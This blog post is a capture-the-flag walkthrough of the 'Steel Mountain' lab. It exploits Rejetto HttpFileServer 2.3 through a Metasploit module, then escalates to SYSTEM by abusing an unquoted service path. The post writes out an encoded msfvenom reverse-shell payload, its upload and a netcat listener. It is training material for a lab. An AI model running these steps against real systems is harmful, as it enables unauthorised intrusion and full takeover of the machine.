---
layout: post
title:  "Steel-Mountain"
categories: blog
layout: post
---

<!--more-->

# Scanning
 
Let's begin by scanning the target. We will first scan the target using Rustscan.

<img src="images/04.Steel-Mountain/01.png" height="600">

<img src="images/04.Steel-Mountain/02.png" height="600">

<img src="images/04.Steel-Mountain/03.png" height="600">

<img src="images/04.Steel-Mountain/04.png" height="400">

<img src="images/04.Steel-Mountain/05.png">

# Enumeration

There are a lot of ports open and since port 80 is open we will check what's running on that port.

There is an image displaying their employee of the month and we can see the name Steel Mountain which might be an organization.

<img src="images/04.Steel-Mountain/06.png" height="500">

While opening the image in a new tab we can see the name of the image as Bill Harper.

<img src="images/04.Steel-Mountain/07.png" height="500">

Now, we will check what's running on port 8080. We can see that there is some file server running. Under the server information, there is mentioned that it is HttpFileServer 2.3. 

<img src="images/04.Steel-Mountain/08.png">

On clicking that leads us to this page which shows that it is a Rejetto HttpFileServer 2.3.

<img src="images/04.Steel-Mountain/09.png" height="100">

<img src="images/04.Steel-Mountain/10.png" height="600">

# Exploitation

We will search in metasploit if we can find any exploits.

<img src="images/04.Steel-Mountain/11.png">

We found a module which is successfully tested on the version 2.3b. So, we will use this.

<img src="images/04.Steel-Mountain/12.png" height="300">

We will set all the required options.

```
set rhost 10.10.2.217
```

```
set rport 8080
```

```
set lhost tun0
```

Run the exploit.

```
exploit
```

<img src="images/04.Steel-Mountain/13.png">

We got the meterpreter reverse shell and we can read the user flag.

<img src="images/04.Steel-Mountain/14.png" height="100">

# Privilege Escalation

Now, we will elevate our privileges. We will download the powershell script which can find common Windows privilege escalation vectors that rely on misconfigurations in the target. We will first download the script to our machine.

Let's upload it to the target.
```
upload powerup.ps1
```

<img src="images/04.Steel-Mountain/15.png">

Load the powershell module and use powershell.
```
load powershell
```
```
powershell_shell
```

Run the script PowerUp.ps1 that we just downloaded into the target and run it.

```
. .\powerup.ps1
```

We will now run all the checks in this module using the following command.
```
Invoke-AllChecks
```
<img src="images/04.Steel-Mountain/16.png">

<img src="images/04.Steel-Mountain/17.png">

When we run the command, we can see that there is a unquoted service path vulnerability as we can see it in the checks.  More information on unquoted service path vulnerability can be found [here.](https://vk9-sec.com/privilege-escalation-unquoted-service-path-windows/) 

<img src="images/04.Steel-Mountain/18.png">

For the service AdvancedSystemCareService9, the CanRestart option is set to true which means that the service can be restarted. We will now create a malicious file and upload it in the IObit folder and then restart the service to get the reverse shell. The file name is set to Advanced because we are uploading the file into the path where the Advanced SystemCare folder is present as we know there is an unquoted service path vulnerability. Since the service AdvancedSystemCareService9 is running as system32, we will be getting a reverse shell as system32.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.2.217 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```
<img src="images/04.Steel-Mountain/19.png">

Exit the powershell. Using the earlier meterpreter reverse shell, change directory to the path IObit and then upload the malicious file that we created.
```
upload Advanced.exe
```
<img src="images/04.Steel-Mountain/20.png">

Open another terminal and use netcat listener on port 4443 to get the reverse shell.
```
nc -lnvp 4443
```
<img src="images/04.Steel-Mountain/21.png" height="200">

Now, load the command prompt shell using the command in the meterpreter shell.

```
shell
```

Restart the AdvancedSystemCareService9 service by using the following commands.

```
sc stop AdvancedSystemCareService9
```
```
sc start AdvancedSystemCareService9
```

Now we get a reverse shell in the other terminal window running as system32!

<img src="images/04.Steel-Mountain/22.png" height="200">

